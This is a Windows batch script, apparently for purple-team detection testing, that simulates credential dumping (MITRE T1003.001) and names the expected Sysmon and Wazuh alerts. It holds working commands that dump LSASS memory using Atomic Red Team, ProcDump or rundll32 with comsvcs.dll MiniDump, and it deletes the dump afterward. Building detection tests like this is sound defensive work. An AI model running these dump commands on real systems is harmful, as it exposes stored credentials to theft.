@echo off
rem ==============================================================================
rem Attack Simulation: In-Memory LSASS Dumping (MITRE ATT&CK T1003.001)
rem Platform: Windows 10 Endpoint (192.168.109.167)
rem Required Tool: Sysinternals ProcDump / Atomic Red Team (T1003.001)
rem ==============================================================================

echo ==================================================================
echo [+] Simulating Credential Access: In-Memory LSASS Dump
echo [+] Telemetry Expected: Sysmon Event ID 10 with GrantedAccess 0x1fffff
echo [+] SIEM Detection: Wazuh Level 12 Rule 100200
echo ==================================================================

rem Check for administrative privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [-] ERROR: Administrative privileges required. Run as Administrator!
    pause
    exit /b 1
)

rem Define dump folder
set DUMP_DIR=%TEMP%\lsass_dump_sim
if not exist "%DUMP_DIR%" mkdir "%DUMP_DIR%"

rem Method 1: Using Atomic Red Team invoke command if installed
if exist "C:\AtomicRedTeam" (
    echo [*] Executing Atomic Red Team test T1003.001...
    powershell.exe -Command "Invoke-AtomicTest T1003.001 -TestNumbers 1"
    goto finish
)

rem Method 2: Direct ProcDump emulation if present
where procdump.exe >nul 2>&1
if %errorLevel% equ 0 (
    echo [*] Firing procdump against lsass.exe...
    procdump.exe -accepteula -ma lsass.exe "%DUMP_DIR%\lsass.dmp"
    goto finish
)

rem Method 3: Comsvcs.dll native Windows memory dump
echo [*] Executing Native Windows Memory Dump via Comsvcs.dll...
powershell.exe -Command "$lsassPid = (Get-Process lsass).Id; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid '%DUMP_DIR%\lsass.dmp' full"

:finish
echo ==================================================================
echo [✓] Execution complete. Check Wazuh Dashboard & Jira Ticket SA-76.
echo [!] Cleaning up dumped artifacts...
if exist "%DUMP_DIR%\lsass.dmp" del /f /q "%DUMP_DIR%\lsass.dmp"
echo ==================================================================
